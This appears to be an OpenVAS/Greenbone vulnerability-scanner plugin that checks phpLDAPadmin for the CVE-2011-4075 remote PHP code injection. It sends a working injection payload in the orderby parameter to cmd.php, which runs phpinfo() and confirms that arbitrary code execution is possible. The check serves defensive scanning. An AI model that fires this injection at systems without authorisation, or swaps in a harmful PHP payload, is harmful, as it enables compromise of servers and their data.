if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103314" );
	script_version( "2020-11-10T06:17:23+0000" );
	script_tag( name: "last_modification", value: "2020-11-10 06:17:23 +0000 (Tue, 10 Nov 2020)" );
	script_tag( name: "creation_date", value: "2011-10-25 16:57:43 +0200 (Tue, 25 Oct 2011)" );
	script_bugtraq_id( 50331 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-4075" );
	script_name( "phpLDAPadmin 'functions.php' Remote PHP Code Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "phpldapadmin_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "phpldapadmin/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50331" );
	script_tag( name: "summary", value: "phpLDAPadmin is prone to a remote PHP code-injection vulnerability." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to inject and execute arbitrary PHP
  code in the context of the affected application. This may facilitate a compromise of the application and
  the underlying system. Other attacks are also possible." );
	script_tag( name: "affected", value: "phpLDAPadmin versions 1.2.0 through 1.2.1.1 are vulnerable." );
	script_tag( name: "solution", value: "Updates are available." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
CPE = "cpe:/a:phpldapadmin_project:phpldapadmin";
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = NASLString( dir, "/index.php" );
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!buf){
	exit( 0 );
}
session_id = eregmatch( pattern: "Set-Cookie: ([^;]*);", string: buf );
if(isnull( session_id[1] )){
	exit( 0 );
}
sess = session_id[1];
host = http_host_name( port: port );
payload = "cmd=query_engine&query=none&search=1&orderby=foo));}}phpinfo();die;/*";
req = NASLString( "POST ", dir, "/cmd.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", sess, "\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Connection: close\\r\\n", "\\r\\n", payload );
res = http_send_recv( port: port, data: req );
if(ContainsString( res, "<title>phpinfo()" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

